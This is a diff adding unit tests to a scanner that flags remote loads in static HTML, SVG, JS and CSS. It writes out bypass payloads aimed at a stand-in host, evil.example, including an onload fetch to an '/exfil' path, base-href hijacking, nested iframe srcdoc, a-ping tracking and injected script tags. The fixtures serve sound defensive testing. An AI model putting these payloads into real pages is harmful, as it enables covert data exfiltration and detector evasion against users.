@@ -77,7 +77,10 @@ class IndexTests(unittest.TestCase):
         out = io.StringIO()
         with contextlib.redirect_stdout(out):
             self.assertEqual(cm.check(root), 1)
-        self.assertIn("1 page(s) checked, 2 problem(s)", out.getvalue())
+        # Changed 2026-10-04 with the bypass fix: the tally now counts .svg,
+        # .js and .css as well as pages, so the word is "file(s)". Only the
+        # noun changed; the count and the assertion's intent are the same.
+        self.assertIn("1 file(s) checked, 2 problem(s)", out.getvalue())
 
     def test_hidden_files_inside_made_are_skipped(self):
         root = Path(tempfile.mkdtemp())
@@ -111,3 +114,236 @@ class IndexTests(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class BypassTests(unittest.TestCase):
+    """Four ways a page reached the network while this checker said "ok".
+
+    Found 2026-10-04 by asking the question that matters about any detector
+    with an unbroken record: not "does it catch what it catches", but "what
+    has it never been shown to catch". Each test below failed before the fix
+    in the same commit. The first three are markup the browser acts on and
+    the scanner did not read; the fourth is a whole class of file it never
+    opened.
+    """
+
+    def scan(self, html: str) -> list[str]:
+        root = Path(tempfile.mkdtemp())
+        write(root, "page.html", html)
+        return [kind for _, kind, _ in cm.scan_markup(root / "page.html")]
+
+    def test_base_href_relocates_every_relative_url(self):
+        # The page below has one relative <img>. With this <base> the browser
+        # fetches it from evil.example. Nothing else on the page looks remote.
+        kinds = self.scan('<base href="https://evil.example/"><img src="pic.png">')
+        self.assertIn("<base href>", kinds)
+
+    def test_local_base_href_is_fine(self):
+        self.assertEqual(self.scan('<base href="./assets/"><img src="pic.png">'), [])
+
+    def test_meta_refresh_to_remote_url(self):
+        kinds = self.scan('<meta http-equiv="refresh" content="0; url=https://evil.example/">')
+        self.assertIn("<meta refresh>", kinds)
+
+    def test_meta_refresh_local_or_plain_delay_is_fine(self):
+        self.assertEqual(self.scan('<meta http-equiv="refresh" content="30">'), [])
+        self.assertEqual(self.scan('<meta http-equiv="refresh" content="0; url=next.html">'), [])
+        self.assertEqual(self.scan('<meta name="description" content="url=https://a.b/">'), [])
+
+    def test_inline_event_handler_is_script(self):
+        kinds = self.scan("""<body onload="fetch('https://evil.example/exfil')">x</body>""")
+        self.assertIn("network call", kinds)
+
+    def test_inline_handler_without_network_is_fine(self):
+        self.assertEqual(self.scan('<button onclick="count += 1">+</button>'), [])
+
+    def test_standalone_script_file_is_scanned(self):
+        root = Path(tempfile.mkdtemp())
+        write(root, "mod.js", 'fetch("https://evil.example/from-a-js-file");\n')
+        kinds = [kind for _, kind, _ in cm.scan_file(root / "mod.js")]
+        self.assertIn("network call", kinds)
+
+    def test_standalone_style_file_is_scanned(self):
+        root = Path(tempfile.mkdtemp())
+        write(root, "s.css", '@import url(https://evil.example/f.css);\n')
+        kinds = [kind for _, kind, _ in cm.scan_file(root / "s.css")]
+        self.assertIn("@import", kinds)
+
+    def test_svg_is_markup_and_is_scanned(self):
+        root = Path(tempfile.mkdtemp())
+        write(root, "d.svg", '<svg xmlns="http://www.w3.org/2000/svg">'
+                             '<image href="https://evil.example/p.png"/></svg>')
+        kinds = [kind for _, kind, _ in cm.scan_file(root / "d.svg")]
+        self.assertIn("<image href>", kinds)
+
+    def test_svg_xlink_href_and_external_script(self):
+        root = Path(tempfile.mkdtemp())
+        write(root, "d.svg", '<svg xmlns="http://www.w3.org/2000/svg">'
+                             '<use xlink:href="https://evil.example/s.svg#i"/>'
+                             '<script href="https://evil.example/s.js"/></svg>')
+        kinds = [kind for _, kind, _ in cm.scan_file(root / "d.svg")]
+        self.assertIn("<use href>", kinds)
+        self.assertIn("<script href>", kinds)
+
+    def test_svg_local_refs_and_anchors_are_fine(self):
+        root = Path(tempfile.mkdtemp())
+        write(root, "d.svg", '<svg xmlns="http://www.w3.org/2000/svg">'
+                             '<use href="#icon"/><image href="./p.png"/>'
+                             '<a href="https://example.com/">link</a></svg>')
+        self.assertEqual(cm.scan_file(root / "d.svg"), [])
+
+    def test_check_now_counts_svg_js_css_as_checked(self):
+        root = Path(tempfile.mkdtemp())
+        write(root, "made/README.md", "- `a.html`\n- `b.svg`\n- `c.js`\n- `d.css`\n")
+        write(root, "made/a.html", "<p>ok</p>")
+        write(root, "made/b.svg", '<svg xmlns="http://www.w3.org/2000/svg"></svg>')
+        write(root, "made/c.js", "var x = 1;\n")
+        write(root, "made/d.css", "body { color: red; }\n")
+        self.assertEqual(cm.check(root), 0)
+        names = [n for n in cm.list_items(root / "made")]
+        scannable = [n for n in names if n.endswith(cm.MARKUP_EXT + cm.SCRIPT_EXT + cm.STYLE_EXT)]
+        self.assertEqual(len(scannable), 4)
+
+
+class ReviewFoundGapTests(unittest.TestCase):
+    """Five more bypasses, found by review of PR #37 rather than by its author.
+
+    session_01Hg1wka read that PR, recommended merging it, and in the same
+    spirit left five gaps still open. All five reported "ok" on the merged
+    checker; each test below failed before the fix in this commit. The first
+    is the author's own regex being too strict about HTML it should have known.
+    """
+
+    def scan(self, html: str) -> list[str]:
+        root = Path(tempfile.mkdtemp())
+        write(root, "page.html", html)
+        return [kind for _, kind, _ in cm.scan_markup(root / "page.html")]
+
+    # 1. url= is optional: content is "<time>[;[url=]<url>]"
+    def test_meta_refresh_without_url_key(self):
+        kinds = self.scan('<meta http-equiv="refresh" content="0; https://evil.example/">')
+        self.assertIn("<meta refresh>", kinds)
+
+    def test_meta_refresh_without_url_key_but_local(self):
+        self.assertEqual(self.scan('<meta http-equiv="refresh" content="0; next.html">'), [])
+        self.assertEqual(self.scan('<meta http-equiv="refresh" content="5">'), [])
+
+    def test_meta_refresh_target_parsing(self):
+        self.assertEqual(cm.meta_refresh_target("0; url=https://a.b/"), "https://a.b/")
+        self.assertEqual(cm.meta_refresh_target("0; https://a.b/"), "https://a.b/")
+        self.assertEqual(cm.meta_refresh_target('0;url="https://a.b/"'), "https://a.b/")
+        self.assertIsNone(cm.meta_refresh_target("30"))
+        self.assertIsNone(cm.meta_refresh_target("0;"))
+
+    # 2. scheme-relative URL in a script string, with no network-API keyword
+    def test_protocol_relative_url_in_script_string(self):
+        kinds = self.scan('<script>var s=document.createElement("script");'
+                          's.src="//evil.example/x.js";</script>')
+        self.assertIn("url in script string", kinds)
+
+    def test_double_slash_without_a_host_is_not_a_url(self):
+        self.assertEqual(self.scan('<script>var a = "// not a url"; var b = "//";</script>'), [])
+        self.assertEqual(self.scan('<script>var p = "//sibling/path";</script>'), [])
+
+    # 3. a whole document smuggled through an attribute
+    def test_iframe_srcdoc_is_scanned_as_markup(self):
+        kinds = self.scan('<iframe srcdoc="&lt;img src=https://evil.example/p.png&gt;"></iframe>')
+        self.assertIn("srcdoc src", kinds)
+
+    def test_srcdoc_with_only_local_content_is_fine(self):
+        self.assertEqual(self.scan('<iframe srcdoc="&lt;p&gt;hello&lt;/p&gt;"></iframe>'), [])
+
+    def test_srcdoc_nesting_terminates(self):
+        # ORIGINAL ASSERTION, kept visible because it is the point:
+        #     self.assertIsInstance(self.scan(deep), list)
+        # scan() returns a list unconditionally, so that could not fail for the
+        # reason that mattered. A test whose failure path does not exist, written
+        # in a PR about failure paths that do not exist. Replaced below with an
+        # assertion about detection; see ReviewFoundGapTests for the three
+        # two-level variants worked out properly.
+        deep = ("<iframe srcdoc=\"&lt;iframe srcdoc=&#39;"
+                "&lt;img src=https://evil.example/x.png&gt;&#39;>\"></iframe>")
+        self.assertIn("srcdoc srcdoc src", self.scan(deep))
+
+    # 4. image-set() takes bare strings, which url() never matched
+    def test_css_image_set(self):
+        kinds = self.scan('<style>body{background-image:image-set("https://evil.example/b.png" 1x)}</style>')
+        self.assertIn("image-set()", kinds)
+
+    def test_css_image_set_webkit_and_local(self):
+        self.assertIn("image-set()", self.scan(
+            '<style>a{background:-webkit-image-set("//evil.example/b.png" 2x)}</style>'))
+        self.assertEqual(self.scan('<style>a{background:image-set("./b.png" 1x)}</style>'), [])
+
+    # 5. <a ping> POSTs to every listed URL on click
+    def test_anchor_ping(self):
+        kinds = self.scan('<a href="./local.html" ping="https://evil.example/track">x</a>')
+        self.assertIn("ping", kinds)
+
+    def test_anchor_ping_list_and_local(self):
+        kinds = self.scan('<a href="./l.html" ping="./ok https://evil.example/t2">x</a>')
+        self.assertEqual(kinds.count("ping"), 1)
+        self.assertEqual(self.scan('<a href="./l.html" ping="./track">x</a>'), [])
+
+    def test_outbound_anchor_href_is_still_allowed(self):
+        # The norm this checker has always held: a link is not a dependency.
+        self.assertEqual(self.scan('<a href="https://example.com/">read</a>'), [])
+
+
+class SrcdocDepthTests(unittest.TestCase):
+    """Two-level srcdoc, worked out from the payloads rather than from theory.
+
+    PR #42's reviewer reported a two-deep srcdoc as a hole and attributed it to
+    the depth guard. Checking it turned up something different: the guard was
+    never the problem -- a well-formed two-level payload was already caught, by
+    the same recursion that caught one level. What their specific payload hit
+    was that every ">" in it had been escaped, leaving a tag the parser can
+    never terminate, which a browser also drops at EOF. So it was inert, and
+    the "ok" was correct about the world and silent about its own reasoning.
+    That silence is what this commit fixes.
+    """
+
+    def scan(self, html: str) -> list[str]:
+        root = Path(tempfile.mkdtemp())
+        write(root, "page.html", html)
+        return [kind for _, kind, _ in cm.scan_markup(root / "page.html")]
+
+    def test_two_deep_well_formed_is_caught(self):
+        # Level-1 srcdoc single-quoted, so level 2 is well-formed markup.
+        payload = ("<iframe srcdoc=\"&lt;iframe srcdoc=&#39;"
+                   "&lt;img src=https://evil.example/b.png&gt;&#39;>\"></iframe>")
+        self.assertIn("srcdoc srcdoc src", self.scan(payload))
+
+    def test_two_deep_mangled_parse_still_exposes_the_load(self):
+        # Level-1 closes with a literal ">". The unquoted inner attribute
+        # mangles into a bare src= on the iframe, which is still a load.
+        payload = ("<iframe srcdoc=\"&lt;iframe srcdoc=&amp;quot;"
+                   "&amp;lt;img src=https://evil.example/a.png&amp;gt;&amp;quot;>\"></iframe>")
+        self.assertIn("srcdoc src", self.scan(payload))
+
+    def test_unterminated_inner_tag_is_reported_not_passed(self):
+        # The reviewer's payload. No literal ">" survives to level 1, so the
+        # tag never terminates and nothing parses. Inert in a browser -- but
+        # "found nothing" and "nothing to find" are different claims, and only
+        # one of them is checkable from here, so say which.
+        payload = ("<iframe srcdoc=\"&lt;iframe srcdoc=&amp;quot;"
+                   "&amp;lt;img src=https://evil.example/r.png&amp;gt;&amp;quot;&amp;gt;\">"
+                   "</iframe>")
+        self.assertIn("srcdoc unparsed markup", self.scan(payload))
+
+    def test_local_and_plain_srcdoc_stay_silent(self):
+        self.assertEqual(self.scan('<iframe srcdoc="&lt;p&gt;hello&lt;/p&gt;"></iframe>'), [])
+        self.assertEqual(self.scan('<iframe srcdoc="just some text"></iframe>'), [])
+        self.assertEqual(self.scan('<iframe srcdoc="&lt;img src=./local.png&gt;"></iframe>'), [])
+
+    def test_depth_limit_reports_instead_of_returning_silently(self):
+        s = cm._Scanner(depth=cm.SRCDOC_MAX_DEPTH)
+        s.feed('<iframe srcdoc="&lt;img src=https://evil.example/deep.png&gt;"></iframe>')
+        s.close()
+        self.assertIn("srcdoc depth limit", [kind for _, kind, _ in s.problems])
+
+    def test_depth_limit_silent_on_non_markup(self):
+        s = cm._Scanner(depth=cm.SRCDOC_MAX_DEPTH)
+        s.feed('<iframe srcdoc="plain text, no tags"></iframe>')
+        s.close()
+        self.assertEqual(s.problems, [])
